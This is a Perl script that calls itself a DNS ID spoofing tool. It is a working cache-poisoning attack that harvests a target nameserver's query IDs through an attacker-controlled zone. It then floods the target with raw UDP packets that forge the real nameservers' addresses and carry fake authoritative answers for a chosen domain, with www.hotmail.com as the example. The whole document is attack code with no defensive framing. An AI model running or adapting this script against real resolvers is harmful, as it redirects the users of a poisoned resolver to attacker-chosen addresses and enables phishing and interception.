#!/usr/bin/perl

use strict;
use Net::DNS;
use Net::DNS::Nameserver;
use IO::Socket;
use Net::RawIP;

sub usage {
	print ("$0 is a program for DNS id spoofing.\n");
	print ("usage: $0 target tospoof ourzone port\n");
	print ("Example: $0 ns1.belbone.be www.hotmail.com .cache-poisoning.net 1025\n");
}

my($target, $tospoof, $ourzone, $query_port) = @ARGV;

$tospoof = "www.hotmail.com" unless($tospoof);
$ourzone = ".cache-poisoning.net" unless($ourzone);
$query_port = 53 unless($query_port);

if(!$target) {
	usage();
	die("You must specify target nameserver\n");
}

my($host, $domain) = split(/\./, $tospoof, 2);

my $client = IO::Socket::INET->new(PeerAddr => $target,
                                   PeerPort => 53,
                                   Proto   => "udp")
or die "Couldn't be a udp client on port 53 : $@\n";


my @nameservers = get_nameservers($domain);
#print join("\n",  @nameservers);
#exit;
cache_ns($client, $tospoof); # Make vitim cache ns record for name to spoof
my @ids = get_sequence($client, $ourzone);
my @replies = prepare_replies(\@nameservers, \@ids, $target, $tospoof);
send_request($client, $tospoof);
send_replies(@replies);

sub prepare_replies($$$$) {
	my($nameservers, $initial_ids, $target, $tospoof) = @_;

	my $totry = 500; # We will try 500 ids subsequent to the one we've got
	my $fakeip = "127.0.0.1"; # IP address that we want the target cache to believe in
	my @replies;

	for my $i (1..$totry) {
            for my $id (@$initial_ids) {
		my $dns_packet = Net::DNS::Packet->new($tospoof);
		$dns_packet->push("pre", rr_add($tospoof . " A " . $fakeip));
		$dns_packet->header->qr(1);
		$dns_packet->header->aa(1); # Authoritative
		$dns_packet->header->rd(1); # Recursion desired
		$dns_packet->header->ra(1); # Recursion available
		$dns_packet->header->id($id+$i);

		for my $nameserver(@$nameservers) {
			my $packet = new Net::RawIP({udp=>{}});
			$packet->set({ip=>{saddr=>$nameserver, daddr=>$target}, 
                                      udp=>{source=>53, dest=>$query_port, data=>$dns_packet->data()}
                                     });
			push @replies, $packet;
		}
            }
	}

	return @replies;
}

sub send_replies(@) {
	my @packets = @_;

	foreach my $packet(@packets) {
		$packet->send(0,2);
	}
}

sub send_request($$) {
	my($client, $tospoof) = @_;

	my $packet = Net::DNS::Packet->new($tospoof, "A");
	$client->send($packet->data()) or die "send: $!";
}

sub cache_ns($$) {
        my($client, $tospoof) = @_;
	my($host, $domain) = split(/\./, $tospoof, 2);

	my $packet = Net::DNS::Packet->new($domain, "NS");
        $client->send($packet->data()) or die "send: $!";
}

sub get_sequence($$) {
    my ($client, $ourzone) = @_;
    my $server = Net::DNS::Nameserver->new( LocalAddr => "0.0.0.0",
                                            LocalPort        => "53",
                                            ReplyHandler =>  \&reply_handler,
                                            Verbose          => 0
    ) || die;
    my @ids;
    for(my $i=0; $i<50; $i++) {
         my $packet = Net::DNS::Packet->new("id$i$$".$ourzone);
         $client->send($packet->data()) or warn "Failed sending packet: $!";
         #print STDERR "Request sent\n";

        ## Wait for request from target nameserver
         sub reply_handler {
             my ($qname, $qclass, $qtype, $peerhost, $query) = @_;
             my ($rcode, @ans, @auth, @add);

             die sprintf "ID %d\n", $query->header->id;

         };
         eval {
             $SIG{ALRM} = sub { die "timeout\n"; };
             alarm(2);
             $server->main_loop();
         };
         alarm(0);

         if ($@ =~ /^timeout/) {
              next;
         };

         unless ($@ =~ /^ID (\d+)/) { die $@; };
         my $id = $1;
         push @ids, $id;
    }
    my @seq = analyse_ids(@ids);
    return @seq;
}

sub analyse_ids {
    my @ids = @_;

    my @seq; # Keeps the last seen number in each sequence
    my $counter = 0;
    my $num_seq = 8; # total number of sequences we track
    my $max_diff = 500; # maximum difference between two subsequent ids in one sequence
    id: for my $id (@ids) {
         for my $i (0..$num_seq) {
             if(defined($seq[$i]) && $seq[$i]<$id && $seq[$i]+$max_diff>$id) {
             # We have already seen numbers from this sequence
                  $seq[$i] = $id; 
                  $counter++;
                  next id;
             }
             if(defined($seq[$i]) && $seq[$i]>65535/4-$max_diff && $id < $max_diff) {
             # Sequence has wrapped
                  $seq[$i] = $id;
                  $counter++;
                  next id;
             }
             if(!defined($seq[$i])) {
             # We have not seen this sequence, and there are still free sequence slots
                  $seq[$i] = $id;
                  $counter++;
                  next id;
             }
         }
         $counter++;
     }
     return @seq;
}

sub get_nameservers($) {
	my $domain = shift;

	my $res   = Net::DNS::Resolver->new;
  	my $query = $res->query($domain, "NS");
	my @nameservers;
  
  	if ($query) {
      		foreach my $rr (grep { $_->type eq 'NS' } $query->answer) {
                        my $server = $rr->nsdname;
          		push @nameservers, host_to_ip($server);
			# Windows always uses first nameserver if available
			return @nameservers;
      		}
  	}
	return(@nameservers);
}

sub host_to_ip($) {
    my $hostname = shift;

    my $ip = join(".", unpack("C4", ((gethostbyname($hostname))[4]) || return $_[0]));
    my $num = unpack("N", pack("C4", split(/\./, $ip)));
    return $num;
}
